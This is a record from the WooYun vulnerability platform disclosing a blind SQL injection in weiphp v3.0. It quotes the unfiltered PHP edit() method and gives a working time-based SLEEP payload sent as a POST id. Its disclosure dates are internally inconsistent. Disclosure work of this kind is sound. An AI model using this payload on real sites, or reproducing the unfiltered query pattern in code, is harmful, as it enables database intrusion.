{"id": 80338, "wybug_id": "wooyun-2015-0156116", "wybug_title": "weiphp v3.0 sql盲注再来一处", "wybug_corp": "weiphp.cn", "wybug_author": "不能忍", "wybug_date": "2015-11-26 16:59", "wybug_open_date": "2015-01-26 10:54", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "11", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-11-26：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-12-01：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放（绿盟科技、唐朝安全巡航）\t\t\t\t\t\t\t\t\t2016-01-25：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-02-04：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-02-14：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-01-26：\t细节向公众公开  简要描述：  详细说明：  漏洞文件:Addons/Extensions/Controller/ExtensionsController.class.php\npublic function edit($model = null, $id = 0) {\t\tis_array ( $model ) || $model = $this->getModel ( $model );\t\t$id || $id = I ( 'id' );\t\t\t\tif (IS_POST) {\t\t\t$Model = D ( parse_name ( get_table_name ( $model ['id'] ), 1 ) );\t\t\t\t\t\t// 清空旧关键词\t\t\t$keyword = $Model->where ( 'id=' . $id )->getField ( 'keyword' );\t\t\t$keyword = preg_split ( '/[\\s,;]+/', $keyword ); // 以空格tab逗号分号分割关键词\t\t\t$data ['addon'] = 'Extensions';\t\t\tforeach ( $keyword as $key ) {\t\t\t\t$data ['keyword'] = trim ( $key );\t\t\t\t$res = M ( 'keyword' )->where ( $data )->delete ();\t\t\t}\t\t\t\t\t\t// 获取模型的字段信息\t\t\t$Model = $this->checkAttr ( $Model, $model ['id'] );\t\t\tif ($Model->create () && $Model->save ()) {\t\t\t\t\t\t\t\t$this->_saveKeyword ( $model, $id );\t\t\t\t\t\t\t\t$this->success ( '保存' . $model ['title'] . '成功！', U ( 'lists?model=' . $model ['name'] ) );\t\t\t} else {\t\t\t\t$this->error ( $Model->getError () );\t\t\t}\t\t} else {\t\t\tparent::edit ( $model, $id );\t\t}\t}\n也是没过滤就直接进库了。payload:http://localhost/index.php?s=/addon/Extensions/Extensions/edit/model/1168/mdm/45|340.htmlpost:id=test) AND (SELECT * FROM (SELECT(SLEEP(6)))test) AND 'wooyun'='wooyun'--   漏洞证明：  \n\n   修复方案：     版权声明：转载请注明来源 不能忍@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-01-26 10:54 厂商回复：  漏洞Rank：4  (WooYun评价) 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}